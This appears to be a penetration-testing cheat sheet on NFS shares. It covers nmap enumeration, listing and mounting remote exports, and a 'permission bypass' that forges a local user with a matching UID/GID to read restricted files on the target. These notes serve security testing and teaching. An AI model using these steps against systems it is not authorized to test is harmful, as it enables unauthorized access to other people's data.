## Enumeration

```sh
nmap --script=nfs-ls,nfs-statfs,nfs-showmount -p 111,2049 <target-ip>
```

<br />

## Mounting Folders

### 1. Check if there are folders avaiable to mount in remote machine.

```sh
showmount -e <target-ip>
```

By the way, If you get error "showmount: command not found", install `nfs-common`.

```sh
apt-cache search showmount
sudo apt install nfs-common
```

### 2. Mount to local folder

If we find a folder available, we can mount it to local folder.  
Create a new folder under **/mnt**.

```sh
sudo mkdir /mnt/test
```

Now mount a folder.

```sh
# -t: Type
# -o nolock: Option. 'nolock' disables file locking. It's required for older NFS servers.
sudo mount -t nfs <target-ip>:/target/dir /mnt/test -o nolock

# -o vers=2: 
sudo mount -t nfs <target-ip>:/target/dir /mnt/test -o nolock -o vers=2
```

### 3. Confirm mounting successfully

```sh
ls /mnt/test
```

### 4. Clean up the mounted folder after investigation

```sh
sudo umount /mnt/test
sudo rm -r /mnt/test
```

### ⚠️Folder Permission Bypass

```bash
ls -al /mnt/

drwx------ 2 1005 1005 4096 Jan 1 00:00 test
```

The permission of the mounted folder is affected by the server's one. If we don't have the permission, we can create a new user with the **same UID/GID** and gain access to the folder.

```bash
# 1. Create a new group with GID 1005
groupadd -g 1005 tester

# 2. Create a new user with UID & GID 1005
useradd -u 1005 -g 1005 tester

# 3. Create a new password for `evil` user
passwd tester

# 4. Switch `evil` user with the password
su tester
```

Now since we have a permission of the mounted folder, we can operate this folder.
